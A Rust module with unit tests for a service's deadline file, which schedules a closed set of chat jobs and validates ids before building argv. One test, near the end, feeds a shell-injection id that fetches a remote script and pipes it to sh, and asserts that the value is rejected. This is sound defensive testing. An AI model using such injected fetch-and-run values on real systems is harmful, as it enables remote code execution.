//! The deadline book: what the service has been asked to do, and when (6j6v.8see).
//!
//! # Why a file and not a launchd agent per deadline
//!
//! The first clock that worked on macOS (6j6v.74c0) wrote ONE `launchd` agent per deadline: a plist
//! in `~/Library/LaunchAgents` whose label carried the thread id, running `/bin/sh -c "cd '<ws>' &&
//! nxc tick --thread <id>; rm …; launchctl bootout …"`. It fired, and it was the honest answer at
//! the time — but the owner looked at the macOS background items and found *"sh — an item from an
//! unidentified developer"*, one entry per open board, with the workspace path spliced into a shell
//! string and a `PATH` pointing at somebody's `target/debug`.
//!
//! The decision (2026-08-25) is one service. So a deadline is no longer an OS job: it is a LINE IN A
//! FILE inside the workspace it belongs to, and the one service that is already sweeping that
//! workspace reads it.
//!
//! # What that buys, point for point
//!
//! - **One background item**, not one per thread — and a board closed before its window ends leaves
//!   no orphan agent, because there was never an agent.
//! - **No shell.** The service runs its own executable with an argv it BUILDS from a closed set of
//!   jobs ([`Job`]); no path and no id is ever spliced into a command string.
//! - **No `PATH`.** The service is already running from the installed binary; it re-invokes itself.
//! - **Seconds, not minutes.** `StartCalendarInterval` has no seconds field, so the old clock
//!   rounded every deadline UP to the next whole minute. The service looks at this book on every
//!   tick.
//!
//! # Why a closed [`Job`] set rather than a stored argv
//!
//! This file lives inside a workspace, and a workspace can be cloned from anywhere. Storing the
//! argv to run would mean a service that executes arbitrary arguments to our own binary on behalf
//! of whoever wrote the repository. The book stores a JOB — a name from a closed set plus its one
//! parameter, itself charset-gated — and the service maps that to an argv it constructs. A job name
//! it does not know is skipped and logged, never guessed at.
//!
//! **The gate is on the READ path, not only the write path** (review of PR #369–#373, Integrity #2 /
//! Test Quality #2). It used to sit in [`arm`] alone — this binary's own, trusted writer — which is
//! precisely the path a hand-crafted book never takes. A book written by hand bypasses `arm`
//! entirely, so the defense built for that scenario did not cover it. [`take_due`] now applies the
//! same gate to what it READS, and refuses an entry rather than handing it on.
//!
//! # And a bound on what one book can cost
//!
//! Reading a file is cheap; acting on it is not. Every entry that comes due becomes a `fork`+`exec`,
//! and a tick that fires them all does so synchronously on the service's ONE thread — so a book with
//! ten thousand due entries was ten thousand processes in one second, and every other workspace's
//! sync and deadlines waited behind them. Writing the raw JSON also bypasses `arm`'s one-entry-per-key
//! rule, so nothing stopped it being written.
//!
//! Two bounds answer that, and neither loses a deadline: [`MAX_BOOK_BYTES`] refuses to parse an
//! absurd file at all, and [`take_due`] takes at most as many due deadlines as the caller says it
//! has room to start — the rest stay armed and fire on a later tick. It is also not only an
//! adversarial case: a laptop closed over a weekend brings every armed window in every workspace due
//! at the same instant.

use std::path::{Path, PathBuf};

use nxs_foundation::error::{NxfError, Result};
use serde::{Deserialize, Serialize};
use time::{format_description::well_known::Rfc3339, OffsetDateTime};

use crate::atomic::write_atomic;

/// The book's file name inside a workspace's `.nxs/` directory.
const TIMERS_FILE: &str = "timers.json";

/// The largest deadline book this build will parse.
///
/// A real one holds a few dozen entries of about a hundred bytes each; a megabyte is thousands of
/// windows, which is already far past anything a person's boards produce. Past that, the file is not
/// a book — it is something a service re-reads and re-parses every second for as long as the
/// workspace stays registered, which is a cost worth refusing rather than paying quietly.
const MAX_BOOK_BYTES: u64 = 1024 * 1024;

/// What the service should do when a deadline falls due.
///
/// A CLOSED set (see the module doc): each variant names a job the service knows how to build an
/// argv for, and carries only the parameter that job needs. Adding a variant is how a new kind of
/// deadline arrives; a variant an older binary does not know deserializes as [`Job::Unknown`] and
/// is skipped rather than guessed at, so a newer client writing into a workspace an older service
/// sweeps degrades to "not honoured" instead of "honoured wrongly".
#[derive(Debug, Clone, PartialEq, Eq, Serialize, Deserialize)]
#[serde(tag = "job", rename_all = "snake_case")]
pub enum Job {
    /// Re-check a chat board's declared window — what `nxc tick --thread <id>` does.
    ChatTick { thread: String },
    /// **Hand a caller the answers that arrived while it was working** — what
    /// `nxc session deliver <id>` does (nxf 6j6v.gn8b).
    ///
    /// Armed when a session announces its end while something is held for it. It is a DEADLINE
    /// rather than a step of that announcement for one reason, and it is a fact about processes
    /// rather than a design preference: the announcement is made BY the ending session, whose
    /// process is necessarily still alive while it speaks — so a resume attempted from inside it
    /// is refused by the single-process guard (nxf 6j6v.7qtf). The grace this deadline carries is
    /// the time that process needs to be gone.
    ChatDeliver { session: String },
    /// **Take up a session that stopped at an availability boundary** — what
    /// `nxc resume --session <id>` does (nxf 6j6v.npy3).
    ///
    /// Armed when a session announces that the model went away, and armed AGAIN by its own firing:
    /// the first firing comes at the same process grace [`ChatDeliver`](Job::ChatDeliver) needs and
    /// secures the working copy, and it re-arms itself for the instant the boundary actually falls
    /// — which a weekly window puts up to a week out. That is `ChatTick`'s shape, which also
    /// re-schedules itself on every decline, and it is why one job kind covers both halves of the
    /// way back rather than two.
    ///
    /// The deadline the service honours is therefore an EARLIEST, never a promise that the window
    /// has lifted; the verb it runs checks that for itself, along with everything else it refuses
    /// to take on trust.
    ChatResume { session: String },
    /// A job this binary does not know. Never written; only produced by reading a book a newer
    /// binary wrote.
    #[serde(other)]
    Unknown,
}

impl Job {
    /// The argv (after the program itself) the service runs for this job, or `None` for a job this
    /// binary cannot build one for.
    ///
    /// `nxs chat …` is byte-identical to `nxc …` (the multicall routes), so this is the same verb a
    /// human types — reached without depending on the `nxc` symlink being installed, or on any
    /// `PATH` at all.
    pub fn argv(&self) -> Option<Vec<String>> {
        match self {
            Job::ChatTick { thread } => Some(vec![
                "chat".into(),
                "tick".into(),
                "--thread".into(),
                thread.clone(),
            ]),
            Job::ChatDeliver { session } => Some(vec![
                "chat".into(),
                "session".into(),
                "deliver".into(),
                session.clone(),
            ]),
            Job::ChatResume { session } => Some(vec![
                "chat".into(),
                "resume".into(),
                "--session".into(),
                session.clone(),
            ]),
            Job::Unknown => None,
        }
    }

    /// The key this job is filed under — one pending deadline per key, so re-arming the same board's
    /// window REPLACES its entry instead of stacking a second one beside it (an `at` queue does the
    /// latter, and that is how a board ended up with several jobs racing for the same window).
    ///
    /// **The key is per JOB KIND, not per id** (nxf 6j6v.gn8b): a chat thread id and an internal
    /// chat session id are both `m-` plus a ULID, and under the deterministic-id switch two of them
    /// are the same string. Without the prefix a board's window and a caller's delivery would file
    /// under one key and the second arm would silently disarm the first. `Cow` rather than `&str`
    /// so the prefixed form can be built without storing it — the borrowed arm costs exactly what
    /// it did.
    pub fn key(&self) -> Option<std::borrow::Cow<'_, str>> {
        match self {
            Job::ChatTick { thread } => Some(std::borrow::Cow::Borrowed(thread)),
            Job::ChatDeliver { session } => {
                Some(std::borrow::Cow::Owned(format!("deliver-{session}")))
            }
            // Prefixed for `ChatDeliver`'s reason, one step more pressing: a session that ends at an
            // availability boundary arms BOTH of these, under the same internal session id, in the
            // same breath. Without distinct prefixes the second arm would silently disarm the
            // first, and which of the two survived would depend on the order two lines run in.
            Job::ChatResume { session } => {
                Some(std::borrow::Cow::Owned(format!("resume-{session}")))
            }
            Job::Unknown => None,
        }
    }
}

/// One pending deadline: a job and the instant it falls due (RFC3339, UTC).
#[derive(Debug, Clone, PartialEq, Eq, Serialize, Deserialize)]
pub struct Deadline {
    /// RFC3339 instant. Stored as the string the caller resolved, so the book reads the same way
    /// `nxc` prints a window.
    pub due: String,
    #[serde(flatten)]
    pub job: Job,
}

/// The on-disk shape: `{"deadline": [ … ]}`.
#[derive(Debug, Default, Serialize, Deserialize)]
struct Book {
    #[serde(default)]
    deadline: Vec<Deadline>,
}

/// The one shape a job's parameter may have before it reaches an argv: `[A-Za-z0-9_-]+`.
///
/// VALIDATED, not sanitised, and the reason is the one 6j6v.74c0's launchd backend recorded: a
/// thread id is an op's `target_id` folded straight out of the op log, and the foundation's ingest
/// of a FOREIGN op inserts it with no format check — so it is untrusted input arriving from a peer
/// replica. Nothing here splices it into a shell, but it does become a key in a file and an argv
/// element, and a mapping that replaced the awkward characters would be many-to-one: two ids
/// differing only in what it replaced would collapse onto one entry, and the second arming would
/// silently destroy the first board's window.
pub fn valid_key(key: &str) -> bool {
    !key.is_empty()
        && key
            .chars()
            .all(|c| c.is_ascii_alphanumeric() || c == '-' || c == '_')
}

/// The book inside `nxs_dir` (a workspace's `.nxs/` directory).
pub fn path_in(nxs_dir: &Path) -> PathBuf {
    nxs_dir.join(TIMERS_FILE)
}

/// Read the book at `path`. An absent or empty file is an empty book — a workspace where nothing has
/// ever been armed is a state, not a fault. A malformed one is loud: the service would otherwise
/// silently stop honouring every window in that workspace, which is the exact silence this whole
/// line of tickets exists to remove.
pub fn read_from(path: &Path) -> Result<Vec<Deadline>> {
    let raw = match read_capped(path) {
        Ok(Some(raw)) => raw,
        Ok(None) => return Ok(Vec::new()),
        Err(e) => return Err(e),
    };
    if raw.trim().is_empty() {
        return Ok(Vec::new());
    }
    let book: Book = serde_json::from_str(&raw).map_err(|e| {
        NxfError::validation(format!(
            "the deadline book {} is not valid JSON: {e}",
            path.display()
        ))
    })?;
    Ok(book.deadline)
}

/// Read at most [`MAX_BOOK_BYTES`] from `path`. `Ok(None)` for a file that is not there — an absent
/// book is an empty one, not a fault.
///
/// Reads through a `take` rather than stat-then-read: a size checked separately from the read is a
/// size that can change in between, and the point is a hard ceiling on what this process holds in
/// memory, not a report about the file.
fn read_capped(path: &Path) -> Result<Option<String>> {
    use std::io::Read as _;
    let file = match std::fs::File::open(path) {
        Ok(f) => f,
        Err(e) if e.kind() == std::io::ErrorKind::NotFound => return Ok(None),
        Err(e) => {
            return Err(NxfError::io(format!(
                "reading the deadline book {}: {e}",
                path.display()
            )))
        }
    };
    let mut raw = String::new();
    // One byte past the ceiling, so a file exactly AT it still reads and one byte over is caught.
    file.take(MAX_BOOK_BYTES + 1)
        .read_to_string(&mut raw)
        .map_err(|e| NxfError::io(format!("reading the deadline book {}: {e}", path.display())))?;
    if raw.len() as u64 > MAX_BOOK_BYTES {
        return Err(NxfError::validation(format!(
            "the deadline book {} is larger than {MAX_BOOK_BYTES} bytes — refusing to parse it. A \
             real book holds a handful of windows; remove the file to start a fresh one.",
            path.display()
        )));
    }
    Ok(Some(raw))
}

fn write_book(path: &Path, mut deadlines: Vec<Deadline>) -> Result<()> {
    // Deterministic order (due, then key) so two arms of the same set produce the same bytes and a
    // human diffing the file sees a stable list.
    deadlines.sort_by(|a, b| {
        a.due.cmp(&b.due).then_with(|| {
            a.job
                .key()
                .unwrap_or_default()
                .cmp(&b.job.key().unwrap_or_default())
        })
    });
    let raw = serde_json::to_vec(&Book {
        deadline: deadlines,
    })
    .map_err(|e| NxfError::io(format!("serializing the deadline book: {e}")))?;
    write_atomic(path, &raw)
}

/// Parse an RFC3339 instant, or say which string was not one.
fn instant(raw: &str, what: &str) -> Result<OffsetDateTime> {
    OffsetDateTime::parse(raw, &Rfc3339)
        .map_err(|e| NxfError::validation(format!("{what} `{raw}` is not RFC3339: {e}")))
}

/// Everything about a deadline that can be refused WITHOUT touching the filesystem: the stamp must
/// be an RFC3339 instant, and the job's key must be one this binary is willing to put into an argv.
///
/// Split out of [`arm`] so a caller can refuse before it resolves a workspace, opens a directory or
/// creates anything — the discipline the removed launchd backend recorded as
/// "every refusal happens before anything is created". [`arm`] calls it too, so the two cannot
/// drift apart.
pub fn check(due: &str, job: &Job) -> Result<()> {
    instant(due, "deadline")?;
    let key = job.key().ok_or_else(|| {
        NxfError::validation("this job carries no key, so it cannot be armed as a deadline")
    })?;
    if !valid_key(&key) {
        return Err(NxfError::validation(format!(
            "`{key}` is not a schedulable id: a deadline's key becomes part of an argv the service \
             runs, so an id outside [A-Za-z0-9_-] is refused rather than mangled into one that \
             could collide with another board's"
        )));
    }
    Ok(())
}

/// Arm `job` for `due` in the book at `path`, REPLACING any pending deadline filed under the same
/// key. Refuses whatever [`check`] refuses, before it reads or writes anything.
pub fn arm(path: &Path, due: &str, job: Job) -> Result<()> {
    check(due, &job)?;
    // `check` above has already established the key exists; this is the same value.
    let key = job.key().unwrap_or_default().into_owned();
    let mut deadlines = read_from(path)?;
    deadlines.retain(|d| d.job.key().as_deref() != Some(key.as_str()));
    deadlines.push(Deadline {
        due: due.to_string(),
        job,
    });
    write_book(path, deadlines)
}

/// Remove the deadline filed under `key`. Returns whether one was there — disarming something that
/// is not armed is a successful no-op, the same contract deregistering a workspace has.
pub fn disarm(path: &Path, key: &str) -> Result<bool> {
    let mut deadlines = read_from(path)?;
    let before = deadlines.len();
    deadlines.retain(|d| d.job.key().as_deref() != Some(key));
    if deadlines.len() == before {
        return Ok(false);
    }
    write_book(path, deadlines)?;
    Ok(true)
}

/// What one look at a workspace's book found.
#[derive(Debug, Default, PartialEq, Eq)]
pub struct Due {
    /// Deadlines that have fallen due AND that this binary can build an argv for. Already removed
    /// from the book by the time this returns.
    pub fired: Vec<Deadline>,
    /// How many due deadlines named a job this binary does not know. LEFT in the book: a newer
    /// binary sweeping the same workspace can still honour them, and dropping them would turn a
    /// version skew into silent data loss.
    pub unknown: usize,
    /// How many entries carry a `due` that is not an RFC3339 instant. Also left in the book — see
    /// [`arm`], which refuses to create one, so this can only come from a hand-edited file.
    pub unreadable: usize,
    /// How many due entries name a key this build will not put into an argv ([`valid_key`]). Also
    /// left in the book — but for the opposite reason to the two above: not because a later build
    /// might accept it, but because DELETING something a hand-crafted file put there is a write this
    /// path has no business making on the strength of a refusal.
    pub rejected: usize,
    /// How many deadlines were due, runnable, and NOT taken because the caller had no room for them
    /// (see [`take_due`]'s `room`). They stay armed; a later tick takes them. Zero on any ordinary
    /// tick.
    pub deferred: usize,
}

/// Take up to `room` deadlines due at or before `now` OUT of the book and return them.
///
/// Taking and returning in one step, under one atomic rewrite, is what makes a fired deadline fire
/// at most once even if the service is killed a moment later: the book no longer names it before
/// anything is spawned. At-most-once is the right side to err on here — the job it runs (`nxc
/// tick`) is idempotent by design and callable by hand, so a lost fire costs a late window, while a
/// repeated one would spend a whole agent turn.
///
/// **`room` is what the caller can actually START, and it is asked for BEFORE anything is taken**
/// (review of PR #369–#373, Integrity #1). Taking first and failing to spawn afterwards would lose
/// the deadline outright — it is already out of the book by then. So the ceiling lives here: what
/// does not fit stays armed, is counted in [`Due::deferred`], and comes due again on the very next
/// tick a second later. A burst therefore drains rather than either flooding the machine or
/// vanishing.
pub fn take_due(path: &Path, now: &str, room: usize) -> Result<Due> {
    let deadlines = read_from(path)?;
    if deadlines.is_empty() {
        return Ok(Due::default());
    }
    let now = instant(now, "the current instant")?;
    let mut out = Due::default();
    let mut pending = Vec::with_capacity(deadlines.len());
    for d in deadlines {
        let Ok(due) = OffsetDateTime::parse(&d.due, &Rfc3339) else {
            // Fail safe in the KEEP direction, exactly like every other unreadable stamp in this
            // repo: a window we cannot date is one we must not silently discard.
            out.unreadable += 1;
            pending.push(d);
            continue;
        };
        if due > now {
            pending.push(d);
            continue;
        }
        if d.job.argv().is_none() {
            out.unknown += 1;
            pending.push(d);
            continue;
        }
        // The SAME gate `arm` applies, applied to what was read. A book is a file inside a
        // workspace, and a workspace can come from anywhere — so the writer this binary controls is
        // not the only writer, and a check that only runs there checks the wrong path.
        if !d.job.key().is_some_and(|k| valid_key(&k)) {
            out.rejected += 1;
            pending.push(d);
            continue;
        }
        if out.fired.len() == room {
            out.deferred += 1;
            pending.push(d);
            continue;
        }
        out.fired.push(d);
    }
    if out.fired.is_empty() {
        return Ok(out);
    }
    write_book(path, pending)?;
    Ok(out)
}

#[cfg(test)]
mod tests {
    use super::*;
    use tempfile::TempDir;

    fn book(dir: &TempDir) -> PathBuf {
        path_in(&dir.path().join(".nxs"))
    }

    /// More room than any test here needs, so a test that is not about the ceiling never trips it.
    const ROOM: usize = 64;

    /// **The collision the `deliver-` prefix exists to prevent** (nxf 6j6v.gn8b; review of that
    /// branch, Test Quality · High).
    ///
    /// A chat thread id and an internal chat session id are both `m-` plus a counter, and under
    /// `NXF_DETERMINISTIC_IDS` the second thread of a workspace and its second session are the SAME
    /// STRING. Without the prefix both jobs file under one key, and arming either silently disarms
    /// the other — a board whose window never fires, or a caller whose answers are never handed
    /// over, with nothing anywhere saying so. `key()`'s doc names that bug; this is the run.
    /// **The same collision, for the pair that is armed together** (nxf 6j6v.npy3).
    ///
    /// A session that ends at an availability boundary arms a DELIVERY (its held answers) and a
    /// RESUME (the way back) under one internal session id, in the same breath — so this is not the
    /// theoretical id clash the case above guards, it is two jobs for the same id by construction.
    /// Sharing a key would let whichever line ran second silently disarm the first.
    #[test]
    fn a_delivery_and_a_resume_for_one_session_are_two_different_keys() {
        let id = "m-00000000000000000000000002";
        let deliver = Job::ChatDeliver {
            session: id.to_string(),
        };
        let resume = Job::ChatResume {
            session: id.to_string(),
        };
        assert_ne!(deliver.key(), resume.key());
        assert_eq!(resume.key().unwrap(), "resume-m-00000000000000000000000002");
        assert!(valid_key(&resume.key().unwrap()));

        let tmp = tempfile::TempDir::new().unwrap();
        let path = tmp.path().join("timers.json");
        arm(&path, "2026-09-12T10:00:10Z", deliver).unwrap();
        arm(&path, "2026-09-14T12:00:00Z", resume).unwrap();
        assert_eq!(read_from(&path).unwrap().len(), 2, "two entries, not one");
    }

    /// The argv is BUILT from the job, never stored — so this pins the one command a resume job
    /// becomes, addressed by SESSION because that is the id the hold is keyed on.
    #[test]
    fn a_resume_job_runs_the_session_scoped_verb() {
        assert_eq!(
            Job::ChatResume {
                session: "m-s1".into()
            }
            .argv()
            .unwrap(),
            vec!["chat", "resume", "--session", "m-s1"]
        );
    }

    /// **Re-arming replaces rather than stacking**, which is what makes the two-stage way back one
    /// entry: the first firing secures the tree and arms itself again for the instant the window
    /// lifts, and an `at`-style queue would have left both deadlines racing.
    #[test]
    fn re_arming_a_resume_moves_its_one_deadline() {
        let tmp = tempfile::TempDir::new().unwrap();
        let path = tmp.path().join("timers.json");
        let job = || Job::ChatResume {
            session: "m-s1".into(),
        };
        arm(&path, "2026-09-12T09:54:02Z", job()).unwrap();
        arm(&path, "2026-09-14T12:00:00Z", job()).unwrap();
        let book = read_from(&path).unwrap();
        assert_eq!(book.len(), 1);
        assert_eq!(book[0].due, "2026-09-14T12:00:00Z");
    }

    #[test]
    fn a_tick_and_a_delivery_for_the_same_id_are_two_different_keys() {
        let id = "m-00000000000000000000000002";
        let tick = Job::ChatTick {
            thread: id.to_string(),
        };
        let deliver = Job::ChatDeliver {
            session: id.to_string(),
        };
        assert_ne!(
            tick.key(),
            deliver.key(),
            "the same id in two job kinds must not file under one key"
        );
        assert_eq!(
            deliver.key().unwrap(),
            "deliver-m-00000000000000000000000002"
        );
        assert!(
            valid_key(&deliver.key().unwrap()),
            "…and the prefixed key is still schedulable, or the job could never be armed at all"
        );

        // And the book agrees: arming both leaves BOTH, and disarming one leaves the other.
        let tmp = tempfile::TempDir::new().unwrap();
        let path = tmp.path().join("timers.json");
        arm(&path, "2026-09-07T10:00:00Z", tick).unwrap();
        arm(&path, "2026-09-07T10:00:10Z", deliver).unwrap();
        assert_eq!(read_from(&path).unwrap().len(), 2, "two entries, not one");
        assert!(disarm(&path, "deliver-m-00000000000000000000000002").unwrap());
        let left = read_from(&path).unwrap();
        assert_eq!(left.len(), 1);
        assert_eq!(
            left[0].job.key().unwrap(),
            id,
            "the board's window survives"
        );
    }

    fn tick(thread: &str) -> Job {
        Job::ChatTick {
            thread: thread.to_string(),
        }
    }

    #[test]
    fn an_absent_book_is_empty_not_an_error() {
        let tmp = TempDir::new().unwrap();
        assert_eq!(read_from(&book(&tmp)).unwrap(), Vec::new());
    }

    #[test]
    fn a_malformed_book_is_loud_and_names_the_file() {
        let tmp = TempDir::new().unwrap();
        let p = book(&tmp);
        std::fs::create_dir_all(p.parent().unwrap()).unwrap();
        std::fs::write(&p, "{not json").unwrap();
        let err = read_from(&p).unwrap_err();
        assert_eq!(err.kind.as_str(), "validation");
        assert!(err.msg.contains("timers.json"), "{}", err.msg);
    }

    #[test]
    fn an_armed_deadline_round_trips() {
        let tmp = TempDir::new().unwrap();
        let p = book(&tmp);
        arm(&p, "2026-08-25T18:00:00Z", tick("m-abc")).unwrap();
        assert_eq!(
            read_from(&p).unwrap(),
            vec![Deadline {
                due: "2026-08-25T18:00:00Z".into(),
                job: tick("m-abc")
            }]
        );
    }

    #[test]
    fn re_arming_the_same_board_replaces_its_window_instead_of_stacking_one_beside_it() {
        let tmp = TempDir::new().unwrap();
        let p = book(&tmp);
        arm(&p, "2026-08-25T18:00:00Z", tick("m-abc")).unwrap();
        arm(&p, "2026-08-25T19:00:00Z", tick("m-abc")).unwrap();
        let got = read_from(&p).unwrap();
        assert_eq!(got.len(), 1, "one pending window per board: {got:?}");
        assert_eq!(got[0].due, "2026-08-25T19:00:00Z");
    }

    #[test]
    fn two_boards_keep_their_own_windows() {
        let tmp = TempDir::new().unwrap();
        let p = book(&tmp);
        arm(&p, "2026-08-25T19:00:00Z", tick("m-b")).unwrap();
        arm(&p, "2026-08-25T18:00:00Z", tick("m-a")).unwrap();
        let got = read_from(&p).unwrap();
        assert_eq!(got.len(), 2);
        assert_eq!(got[0].due, "2026-08-25T18:00:00Z", "sorted by due: {got:?}");
    }

    #[test]
    fn disarming_removes_one_window_and_disarming_again_is_a_no_op() {
        let tmp = TempDir::new().unwrap();
        let p = book(&tmp);
        arm(&p, "2026-08-25T18:00:00Z", tick("m-a")).unwrap();
        arm(&p, "2026-08-25T19:00:00Z", tick("m-b")).unwrap();
        assert!(disarm(&p, "m-a").unwrap());
        assert!(!disarm(&p, "m-a").unwrap());
        assert_eq!(
            read_from(&p)
                .unwrap()
                .iter()
                .map(|d| d.job.key().unwrap().into_owned())
                .collect::<Vec<_>>(),
            vec!["m-b".to_string()]
        );
    }

    #[test]
    fn take_due_returns_only_what_has_fallen_due_and_leaves_the_rest() {
        let tmp = TempDir::new().unwrap();
        let p = book(&tmp);
        arm(&p, "2026-08-25T17:00:00Z", tick("m-past")).unwrap();
        arm(&p, "2026-08-25T19:00:00Z", tick("m-future")).unwrap();
        let got = take_due(&p, "2026-08-25T18:00:00Z", ROOM).unwrap();
        assert_eq!(got.fired.len(), 1);
        assert_eq!(got.fired[0].job, tick("m-past"));
        assert_eq!(
            read_from(&p).unwrap().len(),
            1,
            "the future window stays armed"
        );
    }

    #[test]
    fn a_deadline_exactly_at_now_fires_rather_than_waiting_another_tick() {
        let tmp = TempDir::new().unwrap();
        let p = book(&tmp);
        arm(&p, "2026-08-25T18:00:00Z", tick("m-a")).unwrap();
        assert_eq!(
            take_due(&p, "2026-08-25T18:00:00Z", ROOM)
                .unwrap()
                .fired
                .len(),
            1
        );
    }

    #[test]
    fn the_same_instant_written_in_another_offset_is_the_same_instant() {
        let tmp = TempDir::new().unwrap();
        let p = book(&tmp);
        // 19:00+02:00 IS 17:00Z — a string comparison would call it two hours in the future.
        arm(&p, "2026-08-25T19:00:00+02:00", tick("m-a")).unwrap();
        assert_eq!(
            take_due(&p, "2026-08-25T18:00:00Z", ROOM)
                .unwrap()
                .fired
                .len(),
            1,
            "deadlines are compared as instants, not as spellings"
        );
    }

    #[test]
    fn a_taken_deadline_is_gone_from_the_book_so_it_cannot_fire_twice() {
        let tmp = TempDir::new().unwrap();
        let p = book(&tmp);
        arm(&p, "2026-08-25T17:00:00Z", tick("m-a")).unwrap();
        assert_eq!(
            take_due(&p, "2026-08-25T18:00:00Z", ROOM)
                .unwrap()
                .fired
                .len(),
            1
        );
        assert!(
            take_due(&p, "2026-08-25T18:00:00Z", ROOM)
                .unwrap()
                .fired
                .is_empty(),
            "a second look at the same instant fires nothing"
        );
    }

    #[test]
    fn take_due_on_an_absent_book_writes_nothing() {
        let tmp = TempDir::new().unwrap();
        let p = book(&tmp);
        assert_eq!(
            take_due(&p, "2026-08-25T18:00:00Z", ROOM).unwrap(),
            Due::default()
        );
        assert!(
            !p.exists(),
            "reading a book that is not there must not create one"
        );
    }

    #[test]
    fn a_due_job_this_binary_cannot_run_is_counted_and_left_in_the_book() {
        let tmp = TempDir::new().unwrap();
        let p = book(&tmp);
        std::fs::create_dir_all(p.parent().unwrap()).unwrap();
        std::fs::write(
            &p,
            r#"{"deadline":[{"due":"2026-08-25T17:00:00Z","job":"from_a_newer_binary"}]}"#,
        )
        .unwrap();
        let got = take_due(&p, "2026-08-25T18:00:00Z", ROOM).unwrap();
        assert_eq!(got.fired.len(), 0);
        assert_eq!(got.unknown, 1);
        assert_eq!(
            read_from(&p).unwrap().len(),
            1,
            "a version skew must not become silent data loss"
        );
    }

    #[test]
    fn an_unreadable_stamp_is_counted_and_kept_rather_than_fired_or_dropped() {
        let tmp = TempDir::new().unwrap();
        let p = book(&tmp);
        std::fs::create_dir_all(p.parent().unwrap()).unwrap();
        std::fs::write(
            &p,
            r#"{"deadline":[{"due":"next tuesday","job":"chat_tick","thread":"m-a"}]}"#,
        )
        .unwrap();
        let got = take_due(&p, "2026-08-25T18:00:00Z", ROOM).unwrap();
        assert_eq!((got.fired.len(), got.unreadable), (0, 1));
        assert_eq!(read_from(&p).unwrap().len(), 1);
    }

    #[test]
    fn arming_a_deadline_that_is_not_an_instant_is_refused_at_the_seam() {
        let tmp = TempDir::new().unwrap();
        let p = book(&tmp);
        let err = arm(&p, "next tuesday", tick("m-a")).unwrap_err();
        assert_eq!(err.kind.as_str(), "validation");
        assert!(!p.exists(), "a refused arm leaves no book behind");
    }

    #[test]
    fn an_id_outside_the_charset_is_refused_and_nothing_is_written() {
        let tmp = TempDir::new().unwrap();
        let p = book(&tmp);
        let err = arm(&p, "2026-08-25T18:00:00Z", tick("x; curl http://h/s|sh; #")).unwrap_err();
        assert_eq!(err.kind.as_str(), "validation");
        assert!(!p.exists(), "a refused arm leaves no book behind");
    }

    #[test]
    fn a_job_this_binary_does_not_know_reads_back_as_unknown_and_builds_no_argv() {
        let tmp = TempDir::new().unwrap();
        let p = book(&tmp);
        std::fs::create_dir_all(p.parent().unwrap()).unwrap();
        std::fs::write(
            &p,
            r#"{"deadline":[{"due":"2026-08-25T18:00:00Z","job":"launch_the_missiles","target":"x"}]}"#,
        )
        .unwrap();
        let got = read_from(&p).unwrap();
        assert_eq!(got.len(), 1);
        assert_eq!(got[0].job, Job::Unknown);
        assert_eq!(
            got[0].job.argv(),
            None,
            "an unknown job must never be turned into something to run"
        );
    }

    #[test]
    fn a_chat_tick_builds_the_verb_a_human_would_type() {
        assert_eq!(
            tick("m-abc").argv().unwrap(),
            vec!["chat", "tick", "--thread", "m-abc"]
        );
    }
}
